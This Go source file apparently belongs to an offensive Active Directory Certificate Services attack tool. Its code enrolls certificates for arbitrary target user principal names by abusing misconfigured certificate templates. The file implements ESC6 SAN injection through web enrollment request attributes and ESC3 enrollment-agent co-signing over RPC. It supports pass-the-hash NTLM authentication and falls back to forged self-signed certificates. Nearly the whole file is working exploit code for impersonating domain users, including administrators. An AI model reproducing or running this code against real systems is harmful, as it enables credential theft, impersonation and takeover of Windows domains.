package pki

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

// GenerateCSR creates a PKCS#10 certificate signing request (DER-encoded) with
// the target UPN encoded as an OtherName SAN extension. The Subject CN is
// derived from the user portion of the UPN.
func GenerateCSR(key crypto.Signer, upn string, templateName string) ([]byte, error) {
	// Extract CN from UPN (user@domain -> user)
	cn := upn
	if at := strings.Index(upn, "@"); at > 0 {
		cn = upn[:at]
	}

	// Encode UPN as OtherName SAN using the same encoding as ForgeCertificate
	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
	sanRaw := derTLV(0x30, upnSAN) // SEQUENCE OF GeneralName

	csrTemplate := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: cn,
		},
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17}, // subjectAltName
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, csrTemplate, key)
	if err != nil {
		return nil, fmt.Errorf("create CSR: %w", err)
	}

	return csrDER, nil
}

// EnrollCertificate generates a key pair, creates a CSR, and submits it to the
// CA's web enrollment endpoint (/certsrv/). This produces a CA-signed
// certificate that is valid for authentication against real AD environments.
//
// If sanInject is true (ESC6/ESC7), the UPN SAN is placed in the CertAttrib
// request attributes instead of the CSR itself, exploiting
// EDITF_ATTRIBUTESUBJECTALTNAME2.
//
// Falls back to ForgeCertificate() (self-signed, offline mode) if web
// enrollment is unreachable, with a clear warning.
func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInject bool) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[*] Generating RSA 2048 key pair for enrollment...\n")
	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key pair: %w", err)
	}

	// Generate CSR — if sanInject, omit UPN from CSR (it goes in CertAttrib)
	csrUPN := targetUPN
	if sanInject {
		csrUPN = "" // SAN will be injected via request attributes
	}

	var csrDER []byte
	if csrUPN != "" {
		csrDER, err = GenerateCSR(certKey, csrUPN, templateName)
	} else {
		// Generate CSR without SAN extension for sanInject mode
		cn := targetUPN
		if at := strings.Index(targetUPN, "@"); at > 0 {
			cn = targetUPN[:at]
		}
		csrTemplate := &x509.CertificateRequest{
			Subject: pkix.Name{
				CommonName: cn,
			},
		}
		csrDER, err = x509.CreateCertificateRequest(rand.Reader, csrTemplate, certKey)
	}
	if err != nil {
		return nil, nil, fmt.Errorf("generate CSR: %w", err)
	}
	fmt.Printf("[+] CSR generated (CN=%s, SAN in CSR: %v)\n", targetUPN, !sanInject)

	// Discover CA hostname and name via enrollment services
	caHostname := ""
	caName := ""
	conn, err := ConnectLDAP(context.Background(), cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()
	services, err := EnumerateEnrollmentServices(context.Background(), cfg, conn)
	if err != nil {
		fmt.Printf("[!] Warning: could not enumerate enrollment services: %v\n", err)
	} else if len(services) > 0 {
		caHostname = services[0].DNSHostName
		caName = services[0].Name
		fmt.Printf("[+] Discovered CA: %s (%s)\n", caName, caHostname)
	}

	if caHostname == "" {
		fmt.Printf("[!] WARNING: No CA endpoint discovered\n")
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	// Verify credentials for enrollment (password OR hash required)
	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "" && !cfg.Kerberos) {
		fmt.Printf("[!] WARNING: No username/password/hash for enrollment NTLM auth\n")
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	// Try RPC enrollment first (ICertPassage over SMB named pipe).
	// RPC enrollment properly honors the UPN SAN from the CSR when
	// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set. Web enrollment does NOT.
	fmt.Printf("[*] Attempting RPC enrollment via \\\\%s\\pipe\\cert...\n", caHostname)
	cert, rpcErr := EnrollCertificateRPC(cfg, caHostname, caName, templateName, csrDER)
	if rpcErr == nil {
		fmt.Printf("[+] CA-signed certificate obtained for %s (via RPC)\n", targetUPN)
		return cert, certKey, nil
	}
	fmt.Printf("[!] RPC enrollment failed: %v\n", rpcErr)
	fmt.Printf("[*] Falling back to HTTP web enrollment...\n")

	// Fall back to HTTP web enrollment (/certsrv/)
	// Pass UPN SAN via CertAttrib request attributes (only works if
	// EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled on the CA — ESC6).
	sanAttrib := ""
	if targetUPN != "" && sanInject {
		sanAttrib = fmt.Sprintf("SAN:upn=%s", targetUPN)
		fmt.Printf("[*] SAN via request attributes: %s\n", sanAttrib)
	}

	fmt.Printf("[*] Submitting CSR to %s/certsrv/...\n", caHostname)
	cert, err = submitCSRHTTP(cfg, caHostname, csrDER, templateName, sanAttrib)
	if err != nil {
		fmt.Printf("[!] WARNING: Web enrollment failed: %v\n", err)
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	fmt.Printf("[+] CA-signed certificate obtained for %s (via HTTP)\n", targetUPN)
	return cert, certKey, nil
}

// EnrollCertificateOnBehalf performs CMC enrollment agent co-signing (ESC3 Stage 2).
// It generates a new key pair and CSR for the targetUPN, wraps the CSR in CMS
// SignedData co-signed by the enrollment agent certificate (from ESC3 Stage 1),
// and submits it via RPC with CR_IN_CMC flags.
//
// This implements the real two-stage ESC3 attack: the agent certificate's
// Certificate Request Agent EKU authorizes on-behalf-of enrollment, and the
// CMC wrapper proves possession of the agent key.
func EnrollCertificateOnBehalf(cfg *ADCSConfig, templateName, targetUPN string, agentCert *x509.Certificate, agentKey crypto.Signer) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[*] CMC enrollment on behalf of %s using agent cert (serial=%s)\n", targetUPN, agentCert.SerialNumber.String())

	// Generate new key pair for the target
	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key pair: %w", err)
	}

	// Generate CSR for the target UPN
	csrDER, err := GenerateCSR(certKey, targetUPN, templateName)
	if err != nil {
		return nil, nil, fmt.Errorf("generate CSR: %w", err)
	}
	fmt.Printf("[+] CSR generated for target %s\n", targetUPN)

	// Wrap CSR in CMS SignedData signed by the agent certificate.
	// eContentType = id-data (1.2.840.113549.1.7.1) per CMC specification.
	cmcBlob, err := buildCMCEnrollment(csrDER, agentCert, agentKey)
	if err != nil {
		return nil, nil, fmt.Errorf("build CMC enrollment: %w", err)
	}
	fmt.Printf("[+] CMC SignedData built (%d bytes, co-signed by agent)\n", len(cmcBlob))

	// Discover CA
	caHostname := ""
	caName := ""
	conn, err := ConnectLDAP(context.Background(), cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("ldap connect: %w", err)
	}
	defer conn.Close()
	services, err := EnumerateEnrollmentServices(context.Background(), cfg, conn)
	if err != nil {
		fmt.Printf("[!] Warning: could not enumerate enrollment services: %v\n", err)
	} else if len(services) > 0 {
		caHostname = services[0].DNSHostName
		caName = services[0].Name
		fmt.Printf("[+] Discovered CA: %s (%s)\n", caName, caHostname)
	}

	if caHostname == "" {
		return nil, nil, fmt.Errorf("CMC enrollment requires RPC — no CA endpoint discovered")
	}

	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "" && !cfg.Kerberos) {
		return nil, nil, fmt.Errorf("CMC enrollment requires credentials for RPC authentication")
	}

	// Submit via RPC with CR_IN_CMC flags
	fmt.Printf("[*] Submitting CMC request via RPC to %s (CR_IN_CMC)...\n", caHostname)
	cert, err := EnrollCertificateRPCWithFlags(cfg, caHostname, caName, templateName, cmcBlob, crInBinary|crInCMC)
	if err != nil {
		return nil, nil, fmt.Errorf("CMC RPC enrollment: %w", err)
	}

	fmt.Printf("[+] CA-signed certificate obtained for %s via CMC co-signing\n", targetUPN)
	return cert, certKey, nil
}

// buildCMCEnrollment wraps a PKCS#10 CSR DER in CMS SignedData signed by the
// enrollment agent certificate. The eContentType is id-data (1.2.840.113549.1.7.1)
// per the CMC specification (RFC 5272). The CA validates the agent's signature
// and Certificate Request Agent EKU to authorize on-behalf-of enrollment.
func buildCMCEnrollment(csrDER []byte, agentCert *x509.Certificate, agentKey crypto.Signer) ([]byte, error) {
	return buildCMSSignedDataWithType(csrDER, agentCert, agentKey, oidContentData)
}

// forgeFallback wraps ForgeCertificate for the offline fallback path. The
// returned certificate is self-signed and will not authenticate against a real
// domain controller.
func forgeFallback(key crypto.Signer, upn string) (*x509.Certificate, crypto.Signer, error) {
	cert, certKey, err := ForgeCertificate(key, upn)
	if err != nil {
		return nil, nil, fmt.Errorf("offline forge fallback: %w", err)
	}
	fmt.Printf("[!] OFFLINE MODE: Certificate is self-signed — use only for testing/golden cert scenarios\n")
	return cert, certKey, nil
}

// IsSelfSigned returns true if the certificate is self-signed (issuer == subject).
// Used by autopwn to detect offline fallback certs that won't work against real AD.
func IsSelfSigned(cert *x509.Certificate) bool {
	return cert.Issuer.CommonName == cert.Subject.CommonName
}

// newNTLMClient creates an *http.Client with NTLMv2 transport authentication.
// Supports both plaintext password and pass-the-hash via the cfg.Hash field.
// TLS verification is disabled (required for pen-test tools targeting internal
// AD infrastructure with self-signed certs).
func newNTLMClient(cfg *ADCSConfig) *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{
		Jar: jar,
		Transport: &NTLMTransport{
			Domain:   cfg.Domain,
			Username: normalizeUsername(cfg.Username),
			Password: cfg.Password,
			Hash:     cfg.Hash,
		},
	}
}

// submitCSRHTTP posts a DER-encoded CSR to the CA's web enrollment endpoint
// (/certsrv/certfnsh.asp) using NTLM authentication. It tries HTTPS first,
// then falls back to HTTP. Supports pass-the-hash when cfg.Hash is set.
//
// The CertAttrib field carries the template name and optional SAN injection
// attribute (for ESC6 exploitation).
func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateName string, sanAttrib string) (*x509.Certificate, error) {
	// Base64-encode the CSR with line breaks (certsrv expects PEM-style 76-char lines)
	csrB64Raw := base64.StdEncoding.EncodeToString(csrDER)
	var csrB64 string
	for i := 0; i < len(csrB64Raw); i += 76 {
		end := i + 76
		if end > len(csrB64Raw) {
			end = len(csrB64Raw)
		}
		csrB64 += csrB64Raw[i:end] + "\r\n"
	}

	// Build CertAttrib field
	certAttrib := fmt.Sprintf("CertificateTemplate:%s", templateName)
	if sanAttrib != "" {
		certAttrib += "\n" + sanAttrib
	}

	formData := url.Values{
		"Mode":             {"newreq"},
		"CertRequest":      {csrB64},
		"CertAttrib":       {certAttrib},
		"Type":             {"pkcs10"},
		"TargetStoreFlags": {"0"},
		"SaveCert":         {"yes"},
	}

	var client *http.Client
	// Try HTTPS first, then HTTP
	schemes := []string{"https", "http"}
	var lastErr error

	for _, scheme := range schemes {
		if cfg.Kerberos {
			var krbErr error
			client, krbErr = newKerberosHTTPClient(cfg)
			if krbErr != nil {
				lastErr = fmt.Errorf("Kerberos HTTP client: %w", krbErr)
				continue
			}
			fmt.Println("[*] Using Kerberos/SPNEGO for web enrollment")
		} else {
			client = newNTLMClient(cfg)
		}
		// Pre-flight: GET /certsrv/ to establish NTLM session and cookies.
		// Some certsrv configurations reject direct POSTs without an active session.
		preflightURL := fmt.Sprintf("%s://%s/certsrv/", scheme, caHostname)
		fmt.Printf("[*] Trying %s enrollment: %s\n", strings.ToUpper(scheme), preflightURL)

		preReq, _ := http.NewRequest("GET", preflightURL, nil)
		preResp, err := client.Do(preReq)
		if err != nil {
			lastErr = fmt.Errorf("%s preflight failed: %w", scheme, err)
			fmt.Printf("[!] %s preflight failed: %v\n", strings.ToUpper(scheme), err)
			continue
		}
		io.Copy(io.Discard, preResp.Body)
		preResp.Body.Close()
		if preResp.StatusCode == http.StatusUnauthorized {
			fmt.Printf("[!] %s NTLM auth failed on preflight (HTTP 401)\n", strings.ToUpper(scheme))
			lastErr = fmt.Errorf("NTLM auth failed on %s (HTTP 401)", scheme)
			continue
		}
		fmt.Printf("[+] %s session established (HTTP %d)\n", strings.ToUpper(scheme), preResp.StatusCode)

		// Submit CSR
		submitURL := fmt.Sprintf("%s://%s/certsrv/certfnsh.asp", scheme, caHostname)
		formEncoded := formData.Encode()
		req, err := http.NewRequest("POST", submitURL, strings.NewReader(formEncoded))
		if err != nil {
			lastErr = fmt.Errorf("build request: %w", err)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.GetBody = func() (io.ReadCloser, error) {
			return io.NopCloser(strings.NewReader(formEncoded)), nil
		}

		resp, err := client.Do(req)
		if err != nil {
			lastErr = fmt.Errorf("%s request failed: %w", scheme, err)
			fmt.Printf("[!] %s failed: %v\n", strings.ToUpper(scheme), err)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastErr = fmt.Errorf("read response body: %w", err)
			continue
		}

		fmt.Printf("[*] certsrv response: HTTP %d, %d bytes\n", resp.StatusCode, len(body))

		if resp.StatusCode == http.StatusUnauthorized {
			lastErr = fmt.Errorf("authentication failed (HTTP 401) — check credentials/hash")
			fmt.Printf("[!] HTTP 401 Unauthorized — NTLM auth failed\n")
			continue
		}

		if resp.StatusCode != http.StatusOK {
			lastErr = fmt.Errorf("HTTP %d from certsrv", resp.StatusCode)
			continue
		}

		bodyStr := string(body)

		// Check for inline certificate in the response (some certsrv versions return it directly)
		if block, _ := pem.Decode(body); block != nil && block.Type == "CERTIFICATE" {
			cert, err := x509.ParseCertificate(block.Bytes)
			if err == nil {
				fmt.Printf("[+] Certificate returned inline in certsrv response\n")
				return cert, nil
			}
		}

		// Check for error messages in the response HTML
		if errMsg := extractCertsrvError(bodyStr); errMsg != "" {
			lastErr = fmt.Errorf("certsrv error: %s", errMsg)
			fmt.Printf("[!] CA returned error: %s\n", errMsg)
			continue
		}

		// Check for pending status
		if rePending.MatchString(bodyStr) {
			reqID := extractReqID(bodyStr)
			if reqID != "" {
				fmt.Printf("[!] Certificate request is PENDING (ReqID=%s) — requires CA admin approval\n", reqID)
				fmt.Printf("[*] After approval: certreq -retrieve -config \"%s\" %s cert.cer\n", caHostname, reqID)
			} else {
				fmt.Printf("[!] Certificate request is PENDING — requires CA admin approval\n")
			}
			lastErr = fmt.Errorf("certificate request pending CA admin approval")
			continue
		}

		// Try to extract ReqID from the response
		reqID := extractReqID(bodyStr)
		if reqID == "" {
			fmt.Printf("[!] Could not find certificate request ID in response (HTTP %d, %d bytes)\n", resp.StatusCode, len(body))
			lastErr = fmt.Errorf("could not parse ReqID from certsrv response")
			continue
		}

		fmt.Printf("[+] Certificate request submitted — ReqID=%s\n", reqID)

		// Download the issued certificate
		cert, err := downloadCert(client, caHostname, scheme, reqID)
		if err != nil {
			lastErr = fmt.Errorf("download cert ReqID=%s: %w", reqID, err)
			fmt.Printf("[!] Certificate download failed: %v\n", err)
			// Return reqID info even on download failure so operator can retrieve manually
			fmt.Printf("[*] Manual retrieval: certreq -retrieve -config \"%s\" %s cert.cer\n", caHostname, reqID)
			continue
		}

		return cert, nil
	}

	return nil, fmt.Errorf("web enrollment failed on all schemes: %w", lastErr)
}

// Regex patterns for certsrv response parsing. Multiple patterns cover
// different Windows Server versions and language packs.
var (
	// Certificate download link in HTML
	reReqID = regexp.MustCompile(`certnew\.cer\?ReqID=(\d+)`)
	// JavaScript variable assignment
	reReqIDJS = regexp.MustCompile(`locDownloadCert1\s*=\s*"[^"]*ReqID=(\d+)`)
	// "Your certificate has been issued" with ReqID in form
	reReqIDIssued = regexp.MustCompile(`(?i)certificate has been issued.*?ReqID=(\d+)`)
	// ReqID in any context
	reReqIDGeneric = regexp.MustCompile(`ReqID=(\d+)`)
	// "Request Id:" text (some certsrv versions show this)
	reReqIDText = regexp.MustCompile(`(?i)request\s+id[:\s]+(\d+)`)
	// Error messages
	reErrorMsg = regexp.MustCompile(`<B>\s*Error[^<]*</B>[^<]*<P>\s*([^<]+)`)
	reDenied   = regexp.MustCompile(`(?i)The disposition message is "([^"]*denied[^"]*)"`)
	rePending  = regexp.MustCompile(`(?i)certificate is pending`)
	reNotAuth  = regexp.MustCompile(`(?i)access.denied|not.authorized|unauthorized`)
)

// extractReqID parses the request ID from a certsrv HTML response.
func extractReqID(body string) string {
	if m := reReqID.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reReqIDJS.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reReqIDIssued.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reReqIDText.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reReqIDGeneric.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	return ""
}

// extractCertsrvError parses error messages from certsrv HTML responses.
func extractCertsrvError(body string) string {
	if m := reDenied.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if reNotAuth.MatchString(body) {
		return "access denied / not authorized"
	}
	if m := reErrorMsg.FindStringSubmatch(body); len(m) > 1 {
		return strings.TrimSpace(m[1])
	}
	return ""
}

// downloadCert fetches the issued certificate from the certsrv certnew.cer
// endpoint using the given request ID and parses it into an *x509.Certificate.
// Authentication is handled by the client's NTLMTransport.
func downloadCert(client *http.Client, caHostname, scheme, reqID string) (*x509.Certificate, error) {
	certURL := fmt.Sprintf("%s://%s/certsrv/certnew.cer?ReqID=%s&Enc=b64", scheme, caHostname, reqID)
	fmt.Printf("[*] Downloading certificate: %s\n", certURL)

	req, err := http.NewRequest("GET", certURL, nil)
	if err != nil {
		return nil, fmt.Errorf("build download request: %w", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("download request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read certificate response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d downloading certificate", resp.StatusCode)
	}

	// The response is a base64-encoded DER certificate, possibly PEM-wrapped
	certData := string(body)
	certData = strings.TrimSpace(certData)

	// Try PEM decode first
	block, _ := pem.Decode([]byte(certData))
	if block != nil {
		cert, err := x509.ParseCertificate(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("parse PEM certificate: %w", err)
		}
		return cert, nil
	}

	// Try raw base64 decode
	certDER, err := base64.StdEncoding.DecodeString(certData)
	if err != nil {
		// Try with line breaks stripped
		cleaned := strings.ReplaceAll(certData, "\r", "")
		cleaned = strings.ReplaceAll(cleaned, "\n", "")
		certDER, err = base64.StdEncoding.DecodeString(cleaned)
		if err != nil {
			return nil, fmt.Errorf("decode base64 certificate: %w", err)
		}
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("parse DER certificate: %w", err)
	}

	return cert, nil
}
